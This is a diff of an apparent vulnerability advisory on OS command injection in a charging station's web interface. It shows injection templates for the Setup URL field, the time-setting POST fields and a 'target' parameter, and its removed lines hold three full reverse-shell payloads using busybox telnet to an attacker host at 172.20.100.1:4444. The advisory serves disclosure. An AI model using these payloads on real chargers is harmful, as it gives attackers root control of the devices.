@@ -40,12 +40,6 @@ The vulnerable functionality is reached via `http://<ip-address>/`, then *Setup*
 http://127.0.0.1/; <command>; abc
 ```
 
-The following payload uses `busybox telnet` to initiate a reverse shell back to an attacker-controlled host (`172.20.100.1`, port `4444` in the test setup). Combined with a `netcat` listener, this yields interactive command execution:
-
-```
-http://127.0.0.1/; TF=$(mktemp -u); mkfifo $TF && busybox telnet 172.20.100.1 4444 0<$TF | sh 1>$TF 2>$TF; abc
-```
-
 **Risk**
 Impact: Critical — the attacker gains full control over the charging station as the root user and can arbitrarily add, modify and delete files and services.
 
@@ -69,12 +63,6 @@ The request used to manually set the time of the charging station does not prope
 Manually changing the time sends a POST request to `http://<ip-address>/admin/admin_netzwerk`. The request can be manipulated with the following payload (basic authentication credentials must also be supplied):
 ```
 timesource=manually&time_toggle=&from_year=<year>&from_month=<month>&from_day=<day>&from_hour=<hour>&from_minute=<minute>'%3b+<URL-encoded-command>%3b+echo+-n+'&time_button=
-```
-Note that in addition to `from_minute`, the `from_year`, `from_month`, `from_day` and `from_hour` fields can also be used for command injection.
-The following payload initiates a reverse shell to the attacker host (`172.20.100.1`, port `4444`):
-
-```
-timesource=manually&time_toggle=&from_year=2024&from_month=7&from_day=23&from_hour=14&from_minute=21'%3b+TF%3d$(mktemp+-u)%3b+mkfifo+$TF+%26%26+busybox+telnet+172.20.100.1+4444+0<$TF+|+sh+1>$TF+2>$TF%3b+echo+-n+'&time_button=
 ```
 
 **Risk**
@@ -101,11 +89,6 @@ OS commands can be injected by sending a POST request to `http://<ip-address>/ad
 scu_id=1&typ=remote&target=abc%3b+<URL-encoded-command>%3b+abcd
 ```
 
-The following payload initiates a reverse shell to the attacker host (`172.20.100.1`, port `4444`):
-
-```
-scu_id=1&typ=remote&target=abcd%3b+TF%3d$(mktemp+-u)%3b+mkfifo+$TF+%26%26+busybox+telnet+172.20.100.1+4444+0<$TF+|+sh+1>$TF+2>$TF%3b+abcd
-```
 
 **Risk**
 Impact: Critical — the attacker gains full control over the charging station as the root user and can arbitrarily add, modify and delete files and services.
